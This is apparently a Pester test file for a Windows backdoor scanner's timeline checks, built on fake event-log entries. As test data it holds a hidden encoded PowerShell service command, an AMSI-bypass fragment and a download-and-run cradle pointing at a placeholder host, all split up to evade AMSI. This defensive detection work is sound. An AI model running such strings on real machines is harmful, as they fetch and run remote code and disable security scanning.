# Timeline, with fake events built like the ones read from the Windows logs.
# Suspicious content is assembled at runtime so AMSI does not block the file.

BeforeAll {
    . "$PSScriptRoot\TestHelpers.ps1"
    . (Get-ModuleScript Common)
    . (Get-ModuleScript CommandRisk)
    . (Get-ModuleScript Timeline)

    function New-Ev([int]$Id, [hashtable]$Data, [int]$DaysAgo = 1) {
        [pscustomobject]@{ Time = (Get-Date).AddDays(-$DaysAgo); Id = $Id; Data = $Data }
    }
    function Reset-Scan { $script:Findings.Clear(); $script:Timeline.Clear() }
    function Get-TimelineFindings { @($script:Findings | Where-Object Category -eq 'Timeline') }
}

Describe 'Installed services (7045)' {
    BeforeEach { Reset-Scan }
    It 'rates as High a service with hidden PowerShell, installed and then removed' {
        Mock Test-ServiceExists { $false }
        $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'High'
        $f[0].Title | Should -Match 'then removed: ABCDEFG'
        $script:Timeline[0].FindingId | Should -Be $f[0].Id
    }
    It 'leaves a service that is still installed to the services check' {
        Mock Test-ServiceExists { $true }
        $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline.Count | Should -Be 1
    }
    It 'skips a signed driver, even if removed' {
        Mock Test-ServiceExists { $false }
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'Test'; ImagePath = '\SystemRoot\System32\drivers\null.sys' })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline.Count | Should -Be 0
    }
    It 'groups a driver that reinstalls itself at every boot' {
        Mock Test-ServiceExists { $true }
        $d = @{ ServiceName = 'vpnfilter'; ImagePath = 'C:\nonexistent\vpnfilter.sys' }
        Test-ServiceInstallEvents @((New-Ev 7045 $d 5), (New-Ev 7045 $d 3), (New-Ev 7045 $d 1))
        $script:Timeline.Count | Should -Be 1
        $script:Timeline[0].Text | Should -Match '\(3 times\)'
        ([datetime]$script:Timeline[0].Time).Date | Should -Be (Get-Date).AddDays(-1).Date
    }
}

Describe 'Microsoft Defender' {
    BeforeEach { Reset-Scan }
    It 'sums up in one finding the times protection was turned off' {
        Test-DefenderEvents @((New-Ev 5001 @{} 3), (New-Ev 5001 @{} 1))
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'Medium'
        $f[0].Detail | Should -Match '^2 times'
        $script:Timeline.Count | Should -Be 2
    }
    It 'rates as High a threat Defender could not remove' {
        $p = 'file:_C:\nonexistent\crack.exe'
        Test-DefenderEvents @((New-Ev 1116 @{ 'Threat Name' = 'Trojan:Win32/Test'; Path = $p } 2), (New-Ev 1119 @{ 'Threat Name' = 'Trojan:Win32/Test'; Path = $p } 2))
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'High'
        $f[0].Path | Should -Be 'C:\nonexistent\crack.exe'
    }
    It 'rates as Low a threat already removed' {
        Test-DefenderEvents @(New-Ev 1117 @{ 'Threat Name' = 'HackTool:Win32/Test'; Path = 'file:_C:\nonexistent\keygen.exe'; 'Action Name' = 'Quarantine' })
        (Get-TimelineFindings)[0].Severity | Should -Be 'Low'
    }
    It 'puts an added exclusion in the timeline, without repeating it as a finding' {
        $new = 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Games = 0x0'
        Test-DefenderEvents @(New-Ev 5007 @{ 'New Value' = $new; 'Old Value' = '' })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline[0].Path | Should -Be 'C:\Games'
        $script:Timeline[0].Severity | Should -Be 'Medium'
    }
}

Describe 'Accounts (4720, 4732)' {
    BeforeEach { Reset-Scan }
    It 'flags a created account' {
        Test-AccountEvents @(New-Ev 4720 @{ TargetUserName = 'support'; SubjectUserName = 'bob' })
        (Get-TimelineFindings)[0].Title | Should -Be 'Account created: support'
    }
    It 'flags an account added to the administrators' {
        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-544'; MemberName = 'CN=support'; SubjectUserName = 'bob' })
        (Get-TimelineFindings)[0].Title | Should -Be 'Added to administrators: CN=support'
    }
    It 'ignores additions to other groups' {
        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-555'; MemberName = 'support' })
        Get-TimelineFindings | Should -BeNullOrEmpty
    }
}

Describe 'PowerShell scripts (4104)' {
    BeforeAll {
        $amsi = '[Ref].Assembly.GetType(''System.Management.Automation.' + 'Ams' + 'iUtils'')'
        $cradle = 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://example.invalid/a'')'
    }
    BeforeEach { Reset-Scan }
    It 'rates as High an attempt to disable AMSI' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $amsi })
        (Get-TimelineFindings)[0].Severity | Should -Be 'High'
    }
    It 'keeps download-and-run "to review", since legitimate installers use it too' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle })
        (Get-TimelineFindings)[0].Severity | Should -Be 'Medium'
    }
    It 'ignores the CheckBackdoor scripts' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }) -OwnText "x`n$cradle`ny"
        Get-TimelineFindings | Should -BeNullOrEmpty
    }
    It 'ignores the CheckBackdoor scripts whatever the line endings' {
        # On disk the scripts are CRLF; the event read through XML has LF only
        $script = "function Get-X {`r`n    $cradle`r`n}"
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = ($script -replace "`r`n", "`n") }) -OwnText "x`r`n$script`r`ny"
        Get-TimelineFindings | Should -BeNullOrEmpty
    }
    It 'counts the same script once and only the first part of a long one' {
        Test-PowerShellEvents -Events @(
            (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
            (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
            (New-Ev 4104 @{ MessageNumber = '2'; ScriptBlockText = $amsi }))
        @(Get-TimelineFindings).Count | Should -Be 1
    }
}

Describe 'Started programs (BAM)' {
    It 'translates the device path and the date' {
        $when = Get-Date '2026-03-04 05:06:07'
        $bytes = [byte[]]([BitConverter]::GetBytes($when.ToFileTime()) + [byte[]](0) * 16)
        $e = ConvertFrom-BamValue -Name '\Device\HarddiskVolume3\Users\bob\a.exe' -Value $bytes -DriveMap @{ '\Device\HarddiskVolume3' = 'C:' }
        $e.Path | Should -Be 'C:\Users\bob\a.exe'
        $e.Time | Should -Be $when
    }
    It 'drops non-binary values and unknown devices' {
        ConvertFrom-BamValue -Name 'Version' -Value 1 -DriveMap @{} | Should -BeNullOrEmpty
        ConvertFrom-BamValue -Name '\Device\Network\x.exe' -Value ([byte[]](1..16)) -DriveMap @{} | Should -BeNullOrEmpty
    }
    Context 'rating' {
        BeforeAll {
            $dir = Join-Path $TestDrive 'Downloads'
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
            $tool = Join-Path $dir 'tool.exe'
            Set-Content -LiteralPath $tool -Value 'unsigned'
        }
        BeforeEach { Reset-Scan }
        It 'flags an unsigned program started from a user folder' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
            (Get-TimelineFindings)[0].Severity | Should -BeIn 'High', 'Medium'
        }
        It 'ignores starts older than the window' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-40) }) -Since (Get-Date).AddDays(-30)
            $script:Timeline.Count | Should -Be 0
        }
        It 'only puts in the timeline a program that no longer exists' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = (Join-Path $dir 'gone.exe'); Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
            Get-TimelineFindings | Should -BeNullOrEmpty
            $script:Timeline[0].Text | Should -Match 'no longer exists'
        }
        It 'does not repeat a file already flagged by another check' {
            $script:Findings.Add((New-TestFinding -Category 'Suspicious files' -Path $tool))
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
            Get-TimelineFindings | Should -BeNullOrEmpty
            $script:Timeline.Count | Should -Be 1
        }
        It 'ignores programs installed in Program Files' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = "$env:ProgramFiles\App\app.exe"; Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
            $script:Timeline.Count | Should -Be 0
        }
    }
}
